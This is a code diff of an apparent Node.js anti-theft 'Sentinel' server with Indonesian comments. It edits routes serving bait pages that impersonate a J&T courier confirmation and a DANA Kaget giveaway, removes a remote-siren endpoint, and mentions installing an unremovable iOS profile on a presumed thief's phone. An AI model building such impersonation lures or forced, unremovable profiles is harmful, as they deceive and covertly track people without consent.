@@ -638,7 +638,7 @@ const server = http.createServer((req, res) => {
     }
   }
 
-  // Halaman Umpan Jebakan Pencuri 1: Konfirmasi Paket Kurir J&T
+  // Halaman Umpan Jebakan 1: Konfirmasi Paket Kurir J&T
   if ((pathname === '/paket' || pathname === '/paket.html') && req.method === 'GET') {
     const paketFile = path.join(PUBLIC_DIR, 'paket.html');
     if (fs.existsSync(paketFile)) {
@@ -648,7 +648,7 @@ const server = http.createServer((req, res) => {
     }
   }
 
-  // Halaman Umpan Jebakan Pencuri 2: Klaim Saldo DANA Kaget
+  // Halaman Umpan Jebakan 2: DANA Kaget Rp 150.000
   if ((pathname === '/dana' || pathname === '/dana.html') && req.method === 'GET') {
     const danaFile = path.join(PUBLIC_DIR, 'dana.html');
     if (fs.existsSync(danaFile)) {
@@ -656,21 +656,6 @@ const server = http.createServer((req, res) => {
       fs.createReadStream(danaFile).pipe(res);
       return;
     }
-  }
-
-  // Pemicu Remote Sirene Polisi di HP Pencuri dari Dashboard Laptop
-  if (pathname === '/api/sentinel/trigger_siren' && req.method === 'POST') {
-    broadcast({ type: 'sentinel_siren_trigger', timestamp: Date.now() });
-    for (const client of wss.clients) {
-      if (client.readyState === 1) {
-        client.send(JSON.stringify({ type: 'sentinel_siren_trigger', timestamp: Date.now() }));
-      }
-    }
-    console.log('[Sentinel] 🚨 PERINTAH SIRENE DIKIRIM KE HP PENCURI!');
-    sendToHelper('TEXT [SENTINEL] 🚨 PERINTAH SIRENE AKTIF DI HP PENCURI!');
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ ok: true, message: 'Sirene terpicu di HP pencuri' }));
-    return;
   }
 
   // File Profil Apple (.mobileconfig) — Pasang Aplikasi yang TIDAK BISA DIHAPUS Pencuri (IsRemovable = false)
